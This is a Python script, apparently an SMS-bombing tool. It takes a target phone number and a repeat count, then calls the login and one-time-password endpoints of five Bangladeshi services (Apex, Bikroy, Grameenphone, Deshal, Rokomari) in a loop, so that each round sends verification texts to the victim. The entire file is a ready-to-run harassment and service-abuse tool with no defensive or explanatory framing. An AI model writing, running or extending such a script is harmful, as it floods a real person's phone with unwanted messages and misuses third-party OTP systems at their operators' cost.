import requests
import time

# Function to send request to Apex API
def send_apex(phone_number):
    url = "https://api.apex4u.com/api/auth/login"
    payload = {"phoneNumber": phone_number}
    headers = {"Content-Type": "application/json"}
    response = requests.post(url, json=payload, headers=headers)
    return response

# Function to send request to Bikroy API
def send_bikroy(phone_number):
    url = f"https://bikroy.com/data/phone_number_login/verifications/phone_login?phone={phone_number}"
    response = requests.get(url)
    return response

# Function to send request to GP API
def send_gp(phone_number):
    url = "https://webloginda.grameenphone.com/backend/api/v1/otp"
    payload = {"msisdn": phone_number}
    headers = {"Content-Type": "application/x-www-form-urlencoded"}
    response = requests.post(url, data=payload, headers=headers)
    return response

# Function to send request to Deshal API
def send_deshal(phone_number):
    url = "https://app.deshal.net/api/auth/login"
    payload = {"phone": phone_number}
    headers = {"Content-Type": "application/x-www-form-urlencoded"}
    response = requests.post(url, data=payload, headers=headers)
    return response

# Function to send request to Rokomari API
def send_rokomari(phone_number):
    url = "https://www.rokomari.com/otp/send"
    payload = {"emailOrPhone": phone_number, "countryCode": "BD"}
    headers = {"Content-Type": "application/x-www-form-urlencoded"}
    response = requests.post(url, data=payload, headers=headers)
    return response

# Main function
def main():
    # Take user input
    phone_number = input("Enter the phone number: ")
    num_requests = int(input("Enter the number of times to send SMS: "))
    sleep_time = float(input("Enter sleep time (in seconds) between requests: "))

    # Loop through the number of requests
    for i in range(num_requests):
        print(f"\n[Attempt {i+1}/{num_requests}] Sending requests...\n")

        # Send requests to all APIs
        print("Sending request to Apex...")
        apex_response = send_apex(phone_number)
        print(f"Apex Response: {apex_response.status_code}")

        print("Sending request to Bikroy...")
        bikroy_response = send_bikroy(phone_number)
        print(f"Bikroy Response: {bikroy_response.status_code}")

        print("Sending request to GP...")
        gp_response = send_gp(phone_number)
        print(f"GP Response: {gp_response.status_code}")

        print("Sending request to Deshal...")
        deshal_response = send_deshal(phone_number)
        print(f"Deshal Response: {deshal_response.status_code}")

        print("Sending request to Rokomari...")
        rokomari_response = send_rokomari(phone_number)
        print(f"Rokomari Response: {rokomari_response.status_code}")

        # Sleep before next request cycle
        if i < num_requests - 1:
            print(f"Sleeping for {sleep_time} seconds...\n")
            time.sleep(sleep_time)

if __name__ == "__main__":
    main()